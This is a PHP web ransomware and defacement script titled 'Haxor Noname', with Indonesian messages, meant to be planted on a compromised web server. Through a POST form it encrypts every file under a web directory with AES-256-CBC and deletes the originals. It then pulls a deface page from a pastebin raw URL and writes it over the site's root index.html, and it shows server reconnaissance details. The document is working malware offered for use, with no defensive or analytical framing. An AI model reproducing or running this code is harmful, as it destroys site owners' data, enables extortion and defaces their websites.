<?php
include_once('config.php');

function getServerCountry() {
    return 'N/A'; // lu kontol
}

$dir = '/var/www/html/blabla'; // y

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $key = htmlspecialchars($_POST['key'], ENT_QUOTES, 'UTF-8');

    if (empty($key)) {
        echo "Please enter a key.";
        exit;
    }

    $encryptedFiles = 0;
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    $totalFiles = iterator_count($files);

    foreach ($files as $name => $file) {
        if (!$file->isDir()) {
            $content = file_get_contents($name);
            $iv = openssl_random_pseudo_bytes(16);
            $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key, 0, $iv);
            file_put_contents($name . '.HaxorNoname', $iv . $encrypted);
            unlink($name);
            $encryptedFiles++;
            $progress = round(($encryptedFiles / $totalFiles) * 100, 2);
            echo "Meng-Enkripsi file $name ($progress%)...<br>";
            flush();
            ob_flush();
        }
    }

    echo "File Berhasil Di Enkripsi";
    $country = getServerCountry();
    echo "Server Country: $country";

    $fileUrl = 'https://pastebin.com/raw/6N4yJJEZ';
    $data = file_get_contents($fileUrl);
    file_put_contents('index.html', $data);
    rename('index.html', $_SERVER['DOCUMENT_ROOT'] . '/index.html');
    echo "Script Deface Mu Berhasil dipindahkan ke direktori ROOT.";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Haxor Noname</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/hendprw/asuna/style.css"/>
</head>
<body>
    <h1>Haxor Noname</h1>
    <form method="POST">
        <label for="key">Enter key to encrypt files:</label><br>
        <input type="text" id="key" name="key"><br>
        <input type="submit" value="Submit">
    </form>
    <div class="baginf">
        <h2>Server Information:</h2>
        <ul>
            <li>Web Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
            <li>System: <?php $uname = explode(" ", php_uname()); echo $uname[0] . " " . $uname[1]; ?></li>
            <li>IP: <?php echo gethostbyname($_SERVER['HTTP_HOST']); ?></li>
            <li>Mysql: <?php echo (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>"; ?></li>
            <li>Server Country: <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A'; ?></li>
            <li>Server Version: <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
        </ul>
    </div>
</body>
</html>
